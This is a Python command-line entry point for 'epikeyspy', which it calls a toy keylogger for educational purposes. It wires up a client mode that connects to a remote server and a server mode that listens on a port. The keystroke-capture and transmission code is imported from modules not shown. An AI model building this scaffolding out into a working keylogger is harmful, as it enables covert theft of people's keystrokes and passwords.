from argparse import ArgumentParser

from .client import client_loop
from .server import server_loop

parser = ArgumentParser(prog='epikeyspy',
                        description='A toy keylogger **EDUCATIONAL PURPOSES ONLY**',
                        exit_on_error=True)
subparsers = parser.add_subparsers(required=True, dest='command')

client_subpar = subparsers.add_parser('client', description='Run the client')
client_subpar.add_argument('server')

server_subpar = subparsers.add_parser('server', description='Run the server')
server_subpar.add_argument('-p', '--port', help='the port to use', type=int, default=9999)

args = parser.parse_args()

try:
    if args.command == 'client':
        client_loop(args.server)
    elif args.command == 'server':
        server_loop(args.port)
except KeyboardInterrupt:
    pass
